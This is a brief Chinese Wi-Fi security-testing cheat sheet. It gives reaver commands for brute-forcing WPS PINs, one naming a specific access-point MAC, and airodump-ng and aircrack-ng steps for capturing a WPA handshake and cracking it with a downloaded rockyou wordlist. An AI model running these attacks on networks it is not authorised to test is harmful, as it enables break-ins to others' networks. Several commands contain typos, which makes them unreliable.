# Wi-Fi安全测试

## 目前存在的wifi问题

1. wps暴力破解
2. wpa爆破

## 测试

1. wps功能探测
2. wpa/wap2版本探测
3. 密码暴力破解
4. Nessus协议栈扫描

## wps功能探测

安装aircrack

```bash
sudo apt-get update
sudo apt-get install -y aircrack-ng
```

使用

```bash
#网卡转换为minitor模式
sudo airmon-ng check kill
#重新启动网卡
sudo airmon-ng start wlan0
#监听附件的wifi信号
wash -i wlan0mon --ignore-fcs  #这里有时会报fcs错误,加上该选项即可，查看wps locked这一项，显示NO的都可以尝试
# 对目标进行暴力破解
reaver -i wlan0mon -b MAC -a -S -vv -d0 -c 1  		信号非常好
reaver -i wlan0mon -b MAC -a -S -vv -d2 -t 5 -c 1		信号普通
reaver -i wlan0mon -b MAC -a -S -vv -d5 -c 1			信号一般
reaver -i wlan0mon -b MAC -S -N -vv -c 4
reaver -i wlan0mon -b DC:EE:06:96:B7:B8 -S -N -vv -c 6

```



## WPA/WAP2版本探测

使用

```bash
# 查看ENC项目版本信息
airodump wlan0mon
```



## 密码暴力破解

使用

```bash
# 启动网卡到监听模式
airmon-ng start wlan0
# 开始扫描
airdump-ng mon0
# 抓取4次握手包
airodump-ng -c channelid — bssid macid -w outputpath mon0
# 下载字典破解
curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
aircrack-ng -a2 -b mac -w rockyou.txt hackme.cap
```



## Nessus协议栈扫描

使用Nessus接入网络进行扫描。